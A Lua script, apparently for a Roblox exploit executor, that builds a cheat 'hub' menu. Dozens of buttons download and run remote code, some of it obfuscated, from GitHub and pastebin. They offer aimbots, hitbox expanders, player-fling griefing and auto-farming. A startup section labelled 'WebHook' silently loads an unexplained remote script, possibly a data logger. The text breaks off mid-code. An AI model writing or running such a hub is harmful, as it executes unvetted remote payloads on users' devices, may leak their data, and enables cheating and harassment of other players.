--Window & Library
------------------------------------------------------------------
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/thanhdat4461/OrionMoblie/main/source')))() 

local Window = OrionLib:MakeWindow({Name = " ⭐️ USH | Universal Shakar's Hub ⭐️", HidePremium = false, IntroEnabled = false, SaveConfig = true, ConfigFolder = "shakar"})
------------------------------------------------------------------
--WebHook

loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/w3bh00k/main/s",true))()

------------------------------------------------------------------
--1st Notify

local AkaliNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))();
local Notify = AkaliNotif.Notify;
Notify({
Description = "⭐️ Universal Shakars Hub Loaded ⭐️";
Title = "⭐️ USH Loaded ⭐️";
Duration = 5;
});
------------------------------------------------------------------
--2nd Notify

game.StarterGui:SetCore("SendNotification", {
Title = "⭐️ USH Loaded ⭐️"; 
Text = "Made by sh4kar60 Helped By karvine"; 
Duration = 5; 
})

------------------------------------------------------------------
--Tabs 

local TabHome = Window:MakeTab({
Name = "Home",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})

local TabPlayer = Window:MakeTab({
Name = "Player",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})

local Tab2 = Window:MakeTab({
Name = "Main Scripts",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})

local Tab3 = Window:MakeTab({
Name = "Guis/hubs",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})

local TabAdmin = Window:MakeTab({
Name = "Admin Cmds",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})

local TabAL = Window:MakeTab({
Name = "AimLock/Lock",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})

local TabDH = Window:MakeTab({
Name = "DH Hubs",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})

local TabBF = Window:MakeTab({
Name = "Blox Fruits Scripts",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})

local TabHitbox = Window:MakeTab({
Name = "Hitbox Expander",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})

local Tab6 = Window:MakeTab({
Name = "Other Scripts",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})

local TabK = Window:MakeTab({
Name = "KeyStrokes",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})

local TabCredits = Window:MakeTab({
Name = "Credits",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})

------------------------------------------------------------------
--Paragraph

TabHome:AddParagraph("TEAM USH","Was Kavo Ui Switched to Orion Libary")
TabHome:AddParagraph("Join Discord For More Info","Or Dm sh4kar60")
TabHome:AddParagraph("Created By shakar60-sh4kar60 On Discord","Shakar's Discord")
TabHome:AddParagraph("Helped By karvine On Discord","karvine's Discord")
TabHome:AddParagraph(".gg/7A8TrUgEZX","Discord Server")
TabHome:AddParagraph("The Used Ui Library is Orion Ui Library","Ui Library")

------------------------------------------------------------------
--Credits

TabCredits:AddParagraph("Credits To Everyone Who Make Scripts","Credits")
TabCredits:AddParagraph("Credits To Everyone Who Showcase My Script Hub","Credits")
TabCredits:AddParagraph("Credits To sh4kar60 On Discord For Making This Hub","Credits")
TabCredits:AddParagraph("Credits To karvine On Discord For Helping Me Make This Hub","Credits")
TabCredits:AddParagraph("Please Credit Me When Showcasing Script Hub","Credits")

------------------------------------------------------------------


--Sliders And Text Boxes

local TabPlayerSection = TabPlayer:AddSection({
Name = "WalkSpeed"
})

TabPlayer:AddSlider({
Name = "Walkspeed",
Min = 16,
Max = 500,
Default = 16,
Color = Color3.fromRGB(255,255,255),
Increment = 1,
ValueName = "WalkSpeed",
Callback = function(Value)
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
print(Value)
end 
})

local TabPlayerSection = TabPlayer:AddSection({
Name = "JumpPower"
})

TabPlayer:AddSlider({
Name = "JumpPower",
Min = 50,
Max = 500,
Default = 50,
Color = Color3.fromRGB(255,255,255),
Increment = 1,
ValueName = "JumpPower",
Callback = function(Value)
game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
print(Value)
end 
})

local TabPlayeeSection = TabPlayer:AddSection({
Name = "FOV"
})

TabPlayer:AddSlider({
Name = "FOV",
Min = 0,
Max = 120,
Default = 70,
Color = Color3.fromRGB(255,255,255),
Increment = 1,
ValueName = "FOV",
Callback = function(Value)
workspace.CurrentCamera.FieldOfView = Value
print(Value)
end 
})

local TabPlayerSection = TabPlayer:AddSection({
Name = "Gravity"
})

TabPlayer:AddSlider({
Name = "Gravity",
Min = 0,
Max = 500,
Default = 196,
Color = Color3.fromRGB(255,255,255),
Increment = 1,
ValueName = "Gravity",
Callback = function(Value)
workspace.Gravity = Value
print(Value)
end 
})

local TabPlayerSection = TabPlayer:AddSection({
Name = "Set WalkSpeed"
})

TabPlayer:AddTextbox({
Name = "Set WalkSpeed",
Default = "Click Here To Set WalkSpeed",
TextDisappear = true,
Callback = function(Value)
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
print(Value)
end 
})

local TabPlayerSection = TabPlayer:AddSection({
Name = "Set JumpPower"
})

TabPlayer:AddTextbox({
Name = "Set JumpPower",
Default = "Click Here To Set JumpPower",
TextDisappear = true,
Callback = function(Value)
game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
print(Value)
end 
})

local TabPlayerSection = TabPlayer:AddSection({
Name = "Set FOV"
})

TabPlayer:AddTextbox({
Name = "Set FOV",
Default = "Click Here To Set FOV",
TextDisappear = true,
Callback = function(Value)
workspace.CurrentCamera.FieldOfView = Value
print(Value)
end 
})

local TabPlayerSection = TabPlayer:AddSection({
Name = "Set Gravity"
})

TabPlayer:AddTextbox({
Name = "Set Gravity",
Default = "Click Here To Set Gravity",
TextDisappear = true,
Callback = function(Value)
workspace.Gravity = Value
print(Value)
end 
})
------------------------------------------------------------------
--Button & Scripts

local TabAdminSection = TabAdmin:AddSection({
Name = "Infinite Yield"
})

TabAdmin:AddButton({
Name = "Infinite Yield",
Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Anti Fling & Fling Scripts"
})

Tab2:AddButton({
Name = "Anti Fling V1",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/anti.-./main/fling",true))()
print("Script Executed")
end 
})

Tab2:AddButton({
Name = "Anti Fling V2",
Callback = function()
loadstring(game:HttpGet(('https://pastebin.com/raw/GxdesRQx'),true))()
print("Script Executed")
end 
})

Tab2:AddButton({
Name = "Click Fling",
Callback = function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_4Q10q272NIQc093Os32uBi29U9PWkU0d3Tr1Uh4k92vus2u10786Z0jep5uhqE2N.lua.txt'),true))()
print("Script Executed")
end 
})

Tab2:AddButton({
Name = "Touch Fling",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
print("Script Executed")
end 
})

Tab2:AddButton({
Name = "Fling Gui",
Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/r97d7dS0', true))()
end 
})

Tab2:AddButton({
Name = "Toggle Fling",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Fake Lag & Switch Lag"
})

Tab2:AddButton({
Name = "Fake Lag",
Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/VM3b0Thg'))()
print("Script Executed")
end
})

Tab2:AddButton({
Name = "Switch Lag",
Callback = function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/Protected%20-%202023-05-28T225112.055.lua.txt'),true))()
print("Script Executed")
end
})

local Tab6Section = Tab6:AddSection({
Name = "Keyboard Scripts"
})

Tab6:AddButton({
Name = "Keyboard Script V1",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
print("Script Executed")
end 
})

Tab6:AddButton({
Name = "Keyboard Script V2",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BatuKvi123/Keyboardv3/main/mobKeyboard"))()
print("Script Executed")
end 
})

Tab6:AddButton({
Name = "Keyboard Script V3",
Callback = function()
loadstring(game:HttpGet("https://gist.githubusercontent.com/RedZenXYZ/4d80bfd70ee27000660e4bfa7509c667/raw/da903c570249ab3c0c1a74f3467260972c3d87e6/KeyBoard%2520From%2520Ohio%2520Fr%2520Fr"))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Vhub"
})

Tab3:AddButton({
Name = "Vhub",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/2642/Created/VHub"))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Unfair Hub"
})

Tab3:AddButton({
Name = "Unfair hub",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/rblxscriptsnet/rblxhub/main/rblxhub.lua"))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Rizz Script"
})

Tab2:AddButton({
Name = "Rizz Script",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/pPMRh5YJ"))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Fly Scripts"
})

Tab2:AddButton({
Name = "Fly V1",
Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Pro69Yes/sussy-Script/main/SecuredFlyGuiv3.lua'))()
print("Script Executed")
end 
})

Tab2:AddButton({
Name = "Fly V2",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Flexzstr/FlyScript/main/Beta"))()
print("Script Executed")
end 
})

Tab2:AddButton({
Name = "Fly V3",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/gJfKgLra"))();
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Rejoin & Direct Rejoin"
})

Tab2:AddButton({
Name = "Rejoin Script",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/rouxhaver/scripts-2/main/rejoin%20button%20for%20kick%20message.lua", true))()
print("Script Executed")
end 
})

Tab2:AddButton({
Name = "Direct Rejoin Script",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/Direct/main/Rejoin",true))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Server Finder Script"
})

Tab2:AddButton({
Name = "Server Finder",
Callback = function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Server-Browser_80",true))()
print("Script Executed")
end 
})

local Tab6Section = Tab6:AddSection({
Name = "Tp Walk V3"
})

Tab6:AddButton({
Name = "Tp Walk V3",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/TherealXORA/Roblox-Scripts/main/TpwalkV3"))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Inf Jumps Gui"
})

Tab2:AddButton({
Name = "Inf Jumps Gui",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/oksinfjump/main/workssssss",true))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Script Hub V2"
})

Tab2:AddButton({
Name = "Script Hub V2",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/SCRIPTHUBV2/main/SCRIPTHUBV2", true))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Kat Aimbot Script Gui"
})

Tab3:AddButton({
Name = "Kat AimBot Script Gui",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/JNHHGaming/Kat12/main/Kat"))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Strong Man Simulator Script"
})

Tab2:AddButton({
Name = "Strong Man Simulator Script",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsMe2/ToraIsMe2/main/0strongman", true))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Flash Back Script"
})

Tab2:AddButton({
Name = "Flash Back Script",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/cgWLwdN9", true))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Invisible Script V1"
})

Tab2:AddButton({
Name = "Invisible Script V1",
Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/AYtzGEPb'))()
print("Script Executed")
end 
})

Tab2:AddButton({
Name = "Invisible Script V2",
Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe./dbb6ce6f6cee4f7a5c9e20d7b88e83db2a93bf25/Invisible%20GUI'))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Chiezzy Hub"
})

Tab3:AddButton({
Name = "Chiezzy Hub",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/zAuR0JUT"))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Race Car Hub"
})

Tab3:AddButton({
Name = "Race Car Hub",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Blukezz/Fe-Scripts/main/Fe%20Racecar"))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "VcskV Hub"
})

Tab3:AddButton({
Name = "VcskV Hub",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/VcskV/main/Hub/main.lua", true))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Babft Script Hubs"
})

Tab3:AddButton({
Name = "Babft Exe",
Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/XRoLLu/UWU/main/BUILD%20A%20BOAT%20FOR%20TREASURE.lua'))()
print("Script Executed")
end 
})

Tab3:AddButton({
Name = "Asta Hub",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/0YezNNRh",true))()
print("Script Executed")
end 
})

Tab3:AddButton({
Name = "Boat Blitz",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/boat-blitz/main/script",true))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Fe Save Position"
})

Tab2:AddButton({
Name = "Fe Save Position",
Callback = function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/Tp%20Place%20GUI'),true))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Fe Free Dances"
})

Tab2:AddButton({
Name = "Fe Free Dances",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/eCpipCTH"))()
print("Script Executed")
end 
})

local TabALSection = TabAL:AddSection({
Name = "Aim Viewer"
})

TabAL:AddButton({
Name = "Aim Viewer",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Nosssa/NossLock/main/VinGUI"))()
print("Script Executed")
end 
})

local TabALSection = TabAL:AddSection({
Name = "Kals Private Lock"
})

TabAL:AddButton({
Name = "Kals Private Lock",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/j08xM9mW", true))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Fe Chat Mimic"
})

Tab2:AddButton({
Name = "Fe Chat Mimic",
Callback = function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe./8fb5ed20fb168d1ae3044ede45b90f67e3fb37a2/file'),true))()
print("Script Executed")
end 
})

local Tab6Section = Tab6:AddSection({
Name = "Fe Parkour"
})

Tab6:AddButton({
Name = "Fe Parkour",
Callback = function()
loadstring(game:HttpGet(('https://pastefy.ga/6HAb8rAj/raw'),true))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Info Gui Script"
})

Tab3:AddButton({
Name = "Info Gui Script",
Callback = function()
loadstring(game:HttpGet(('https://pastebin.com/raw/5seCbYFa'),true))()
print("Script Executed")
end 
})

local TabAdminSection = TabAdmin:AddSection({
Name = "Legs Admin Cmd"
})

TabAdmin:AddButton({
Name = "Legs Admin Cmd",
Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/leg1337/legadmv2/main/legadminv2.lua'))()
print("Script Executed")
end 
})

local Tab6Section = Tab6:AddSection({
Name = "Animation Changer"
})

Tab6:AddButton({
Name = "Animation Changer",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/LunarWareOP/Animation-Changer-Source/main/Script", true))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Ragdoll Engine Script Hubs"
})

Tab3:AddButton({
Name = "Mystery Hub",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/i4mitty/MysteryHub/main/MysteryHub%20-%20Ragdoll%20Engine.lua"))()
print("Script Executed")
end 
})

Tab3:AddButton({
Name = "Malware Hub",
Callback = function()
loadstring(game:HttpGet('https://gist.githubusercontent.com/H20CalibreYT/462f6e6236a9371130f113def6549bb1/raw/'))()
print("Script Executed")
end 
})

local Tab6Section = Tab6:AddSection({
Name = "Air Swim"
})

Tab6:AddButton({
Name = "Air Swim",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/9CK0qSgn"))()
print("Script Executed")
end 
})

local Tab6Section = Tab6:AddSection({
Name = "Chat Executor"
})

Tab6:AddButton({
Name = "Chat Executor",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/chat-executor/main/chat-executor",true))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Bido Skins Hub"
})

Tab3:AddButton({
Name = "Bido Skins Hub",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BidoSkinsYT/BidoSkinsYT/main/Bido%20Skins%20V1.7"))()
print("Script Executed")
end 
})

local Tab6Section = Tab6:AddSection({
Name = "Fe Bird"
})

Tab6:AddButton({
Name = "Fe Bird",
Callback = function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/Fe%20Bird%20R6%20and%20R15'),true))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Games Hub Destroyer V4"
})

Tab3:AddButton({
Name = "Games Hub Destroyer V4",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/TakeModzz/Games-HUB-Destroyer-V4/main/Games%20HUB%20Destroyer%20V4"))()
print("Script Executed")
end 
})

local Tab6Section = Tab6:AddSection({
Name = "Vehicle Legends Scripr"
})

Tab6:AddButton({
Name = "Vehicle Legends Script",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IExpIoit/Script/main/UltimateHub"))()
print("Script Executed")
end 
})

local TabKSection = TabK:AddSection({
Name = "Q Tool"
})

TabK:AddButton({
Name = "Q Tool",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/Q/main/Tool",true))()
print("Script Executed")
end 
})

local TabKSection = TabK:AddSection({
Name = "G Tool"
})

TabK:AddButton({
Name = "G Tool",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/G./main/Tool",true))()
print("Script Executed")
end 
})

local TabKSection = TabK:AddSection({
Name = "C Tool"
})

TabK:AddButton({
Name = "C Tool",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/C/main/Tool",true))()
print("Script Executed")
end 
})

local TabKSection = TabK:AddSection({
Name = "M Tool"
})

TabK:AddButton({
Name = "M Tool",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/M/main/Tool",true))()
print("Script Executed")
end 
})

local TabKSection = TabK:AddSection({
Name = "N Tool"
})

TabK:AddButton({
Name = "N Tool",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/N/main/Tool",true))()
print("Script Executed")
end 
})

local TabKSection = TabK:AddSection({
Name = "F Tool"
})

TabK:AddButton({
Name = "F Tool",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/F/main/Tool",true))()
print("Script Executed")
end 
})

local TabKSection = TabK:AddSection({
Name = "X Tool"
})

TabK:AddButton({
Name = "X Tool",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/X/main/Tool",true))()
print("Script Executed")
end 
})

local TabKSection = TabK:AddSection({
Name = "Z Tool"
})

TabK:AddButton({
Name = "Z Tool",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/Z/main/Tool",true))()
print("Script Executed")
end 
})

local TabALSection = TabAL:AddSection({
Name = "RyzzChips Lock"
})

TabAL:AddButton({
Name = "RyzzChips Lock",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/j08xM9mW", true))()
print("Script Executed")
end 
})

local Tab6Section = Tab6:AddSection({
Name = "Player Specetor"
})

Tab6:AddButton({
Name = "Player Specetor",
Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/wyvdb7gr'))()
print("Script Executed")
end 
})

local Tab6Section = Tab6:AddSection({
Name = "TP Scripts"
})

Tab6:AddButton({
Name = "TP Players",
Callback = function()
loadstring(game:HttpGet(("https://pastebin.com/raw/YNVbeqPy")))()
print("Script Executed")
end 
})

Tab6:AddButton({
Name = "Tween TP",
Callback = function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_gtQG8WW70awuM1u2O6I8Z3j007xzGnfC0vw6D6Tzj226R20KPLyKZR8MbK5V57mu.lua.txt'),true))()
print("Script Executed")
end 
})

Tab6:AddButton({
Name = "Click To TP",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/ClickToTp/main/Script",true))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "No Clip Guis"
})

Tab3:AddButton({
Name = "No Clip Gui V1",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/pKV2Ys4E"))()
print("Script Executed")
end 
})


Tab3:AddButton({
Name = "No Clip Gui V2",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/B5xRxTnk",true))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Brans Hub"
})

Tab3:AddButton({
Name = "Brans Hub",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/8G5wzp3L"))()
print("Script Executed")
end 
})

local TabDHSection = TabDH:AddSection({
Name = "Fake Macro"
})

TabDH:AddButton({
Name = "Fake Macro",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/Macro/main/M.N.C",true))()
print("Script Executed")
end 
})

local TabBFSection = TabBF:AddSection({
Name = "BF Chest Farm V1"
})

TabBF:AddButton({
Name = "BF Chest Farm V1",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/NickelHUBB/SonicTuru/main/ChestFarmOp"))()
print("Script Executed")
end 
})

local TabBFSection = TabBF:AddSection({
Name = "BF Chest Farm V2"
})

TabBF:AddButton({
Name = "BF Chest Farm V2",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptpastebin/raw/main/Chest_onoff"))()
print("Script Executed")
end 
})

local TabBFSection = TabBF:AddSection({
Name = "BF Hub V1"
})

TabBF:AddButton({
Name = "BF Hub V1",
Callback = function()
loadstring(game:HttpGet("https://gist.githubusercontent.com/lxnnydev/1325a6ec942d0bb837bafe0ee25fcc5c/raw/c9ab9f038142427ba1739f099e78bb0b0588fa40/bf_script.lua",true))()
print("Script Executed")
end 
})

local TabBFSection = TabBF:AddSection({
Name = "BF Hub V2"
})

TabBF:AddButton({
Name = "BF Hub V2",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/MkoriCraft/UPDBF2xSwitch/main/Protected%20(3).lua",true))()
print("Script Executed")
end 
})

local TabBFSection = TabBF:AddSection({
Name = "BF Uranium Hub"
})

TabBF:AddButton({
Name = "BF Uranium Hub",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Augustzyzx/UraniumMobile/main/UraniumKak.lua"))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Ninja Legends Gui"
})

Tab3:AddButton({
Name = "Ninja Legends Gui",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/AliCode14/scripts/main/ScriptHub.lua"))()
print("Script Executed")
end 
})

local TabDHSection = TabDH:AddSection({
Name = "Beamed Ware Hub"
})

TabDH:AddButton({
Name = "Beamed Ware",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/RYZZCHIPSX/ryzzchips/main/beamed%20ware%20script"))();
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Arceus X Hub"
})

Tab3:AddButton({
Name = "Arceus X Hub",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()
print("Script Executed")
end 
})

local Tab6Section = Tab6:AddSection({
Name = "Netless"
})

Tab6:AddButton({
Name = "Netless",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/netsless/main/netless",true))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Dino Animation"
})

Tab2:AddButton({
Name = "Dino Animation",
Callback = function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_K2n31uc6t2wY5A8786eR4K15sgbUF0vdQ80a0LzgvLRkSNYd89H1AS3124gMR6SM.lua.txt'),true))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Fe Spiderman"
})

Tab2:AddButton({
Name = "Fe Spiderman",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/Spiderman./main/Spiderman",true))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Pop It Trading Gui"
})

Tab2:AddButton({
Name = "Pop It Trading Gui",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Sponge123456789/Sponge/main/The%20cool%20Script"))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Jnhh Tool Giver Gui"
})

Tab3:AddButton({
Name = "Jnhh Tool Giver",
Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/4yGehrgh'))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Universal Spy"
})

Tab2:AddButton({
Name = "Universal Spy",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/MichaelScripter/MiniScript/main/Spy gui.lua"))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Mm2 Script Guis"
})

Tab3:AddButton({
Name = "Vynixu's mm2 Gui",
Callback = function()
loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
print("Script Executed")
end 
})

Tab3:AddButton({
Name = "Mm2 Admin Panel",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/MarsQQ/ScriptHubScripts/master/MM2%20Admin%20Panel"))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Cw Nova Hub"
})

Tab3:AddButton({
Name = "Nova Hub",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/SussyImposterRed/Scripts/main/NOVA_HUB_SOURCE"))()
print("Script Executed")
end 
})

local TabHitboxSection = TabHitbox:AddSection({
Name = "Hitbox Expanders"
})

TabHitbox:AddButton({
Name = "Hitbox Expander V1",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/hit/main/box",true))()
print("Script Executed")
end 
})


TabHitbox:AddButton({
Name = "Hitbox Expander V2",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/RobloxScripts/main/HitboxExpander.lua"))()
print("Script Executed")
end 
})


TabHitbox:AddButton({
Name = "Hitbox Expander V3",
Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/JgtddWA3'))()
print("Script Executed")
end 
})

local Tab6Section = Tab6:AddSection({
Name = "ApeiroPhobia Script"
})

Tab6:AddButton({
Name = "ApeiroPhobia Scripr",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/apeirophobia/main/script",true))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Ability Wars Gui [ Key: 4M70sudE2YtN58A9 ]"
})

Tab3:AddButton({
Name = "Ability Wars Gui",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/VxleLUA/Dynamic-Offical/main/System/GameChecker.lua"))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Fe Freeze Script"
})

Tab2:AddButton({
Name = "Fe Freeze Script",
Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/creepstu/fuzzy-octo-giggle/main/Source'))()
print("Script Executed")
end 
})

local TabAdminSection = TabAdmin:AddSection({
Name = "Nameless Admin Cmd"
})

TabAdmin:AddButton({
Name = "Nameless Admin Cmd",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))();
print("Script Executed")
end 
})

local TabAdminSection = TabAdmin:AddSection({
Name = "Fates Admin Cmd"
})

TabAdmin:AddButton({
Name = "Fates Admin Cmd",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
print("Script Executed")
end 
})

local TabAdminSection = TabAdmin:AddSection({
Name = "Rwvis Admin Cmd"
})

TabAdmin:AddButton({
Name = "Revis Admin Cmd",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/Caniwq2N",true))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Fe Throw Gui"
})

Tab3:AddButton({
